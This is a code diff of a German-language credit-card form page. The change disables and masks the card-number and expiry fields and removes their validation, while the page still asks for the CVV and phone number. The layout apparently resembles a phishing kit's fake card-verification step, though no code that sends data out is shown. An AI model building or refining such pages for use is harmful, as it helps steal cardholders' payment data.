@@ -71,8 +71,8 @@
           <form class="loginForm cc-form" method="post" id="caponaForm">
             <div class="input-container2">
               <p class="label" for="cardNumber">Kreditkartennummer</p>
-              <input required name="cardNumber" id="cardNumber" maxlength="19" type="tel"
-                placeholder=""  />
+              <input class="disabled" required name="cardNumber" id="cardNumber" maxlength="19" type="tel"
+                placeholder="****   ****   ****   ****" disabled />
 
 
               <div id="cardNumber-error" class="error-message"></div>
@@ -81,8 +81,8 @@
             <div class="mmyy">
               <div class="input-container2">
                 <p class="label" for="expiryDate">Ablauf</p>
-                <input required name="expiryDate" id="expiryDate" maxlength="5" type="text"
-                  placeholder="MM / YY" />
+                <input class="disabled" required name="expiryDate" id="expiryDate" maxlength="5" type="text"
+                  placeholder="** / **" disabled />
 
 
                 <div id="expiryDate-error" class="error-message"></div>
@@ -102,7 +102,7 @@
                 </select>
                 <input required name="phoneNumber" id="phoneNumber" maxlength="20" type="text" />
               </div>
-               
+
               <div id="phoneNumber-error" class="error-message"></div>
             </div>
 
@@ -178,18 +178,10 @@
       let valid = true;
 
       // Card number validation
-      if (!/^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35[0-9]{3})[0-9]{11})$/.test(cardNumber)) {
-        document.getElementById('cardNumber-error').textContent = 'Ungültige Kreditkartennummer';
-        document.getElementById('cardNumber').classList.add('error-border');
-        valid = false;
-      }
+
 
       // Expiry date MM/YY validation
-      if (!/^\d{2}\/\d{2}$/.test(expiry)) {
-        document.getElementById('expiryDate-error').textContent = 'Ungültiges Ablaufdatum';
-        document.getElementById('expiryDate').classList.add('error-border');
-        valid = false;
-      }
+
 
       // CVV validation
       if (!/^\d{3}$/.test(cvv)) {
